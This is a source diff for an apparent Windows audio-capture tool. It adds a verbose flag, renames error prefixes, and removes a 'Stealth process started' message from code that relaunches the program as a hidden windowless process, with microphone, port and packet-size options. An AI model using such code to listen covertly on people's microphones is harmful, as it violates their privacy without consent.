@@ -8,10 +8,10 @@ int ArgToInt(const std::string& argName, const char* value) {
         return std::stoi(value);
     }
     catch (const std::invalid_argument&) {
-        throw std::runtime_error("[-] Invalid integer for " + argName + ": " + value);
+        throw std::runtime_error("[ERROR] Invalid integer for " + argName + ": " + value);
     }
     catch (const std::out_of_range&) {
-        throw std::runtime_error("[-] Value out of range for " + argName + ": " + value);
+        throw std::runtime_error("[ERROR] Value out of range for " + argName + ": " + value);
     }
 }
 
@@ -19,6 +19,7 @@ int main(int argc, char* argv[]) {
     bool runInBackground = false;
     bool isChildProcess = false;
     bool listMicrophones = false;
+    bool isVerbose = false;
 
     AudioManager AM;
     int micIndex = -1;
@@ -38,17 +39,20 @@ int main(int argc, char* argv[]) {
             else if (arg == "--list") {
                 listMicrophones = true;
             }
+            else if (arg == "--verbose") {
+                isVerbose = true;
+            }
             else if (arg == "--sleep" && i + 1 < argc) {
                 sleepInput = ArgToInt("--sleep", argv[++i]);
                 if (sleepInput < 0 || sleepInput > 4) {
-                    std::cerr << "[-] Invalid sleep input: " << sleepInput << " must be between 0->4" << std::endl;
+                    std::cerr << "[ERROR] Invalid sleep input: " << sleepInput << " must be between 0->4" << std::endl;
                     return 1;
                 }
             }
             else if (arg == "--packet-size" && i + 1 < argc) {
                 packetSize = ArgToInt("--packet-size", argv[++i]);
                 if (packetSize <= 0 || packetSize > 65355) {
-                    std::cerr << "[-] Invalid packet size input: " << packetSize << " must be between 1->65355" << std::endl;
+                    std::cerr << "[ERROR] Invalid packet size input: " << packetSize << " must be between 1->65355" << std::endl;
                     return 1;
                 }
             }
@@ -61,7 +65,7 @@ int main(int argc, char* argv[]) {
             else if (arg == "--port" && i + 1 < argc) {
                 port = ArgToInt("--port", argv[++i]);
                 if (port <= 0 || port > 65355) {
-                    std::cerr << "[-] Invalid port: " << port << " must be between 1->65355" << std::endl;
+                    std::cerr << "[ERROR] Invalid port: " << port << " must be between 1->65355" << std::endl;
                     return 1;
                 }
             }
@@ -91,16 +95,17 @@ int main(int argc, char* argv[]) {
         si.cb = sizeof(si);
 
         if (CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
-            std::cout << "[+] Stealth process started. Exiting parent.\n";
             CloseHandle(pi.hProcess);
             CloseHandle(pi.hThread);
-            return 0; // Parent exits
+            return 0;
         }
         else {
-            std::cerr << "[-] Failed to create background process. Error: " << GetLastError() << "\n";
+            std::cerr << "[ERROR] Failed to create background process. Error: " << GetLastError() << "\n";
             return 1;
         }
     }
+
+    AM.SetIsVerbose(isVerbose);
 
     // 3. Execution Flow
     if (listMicrophones) {
@@ -118,7 +123,7 @@ int main(int argc, char* argv[]) {
     }
 
     if (!AM.Initialize()) {
-        std::cerr << "[-] Initialization failed.\n";
+        std::cerr << "[ERROR] Initialization failed.\n";
         return 1;
     }
 
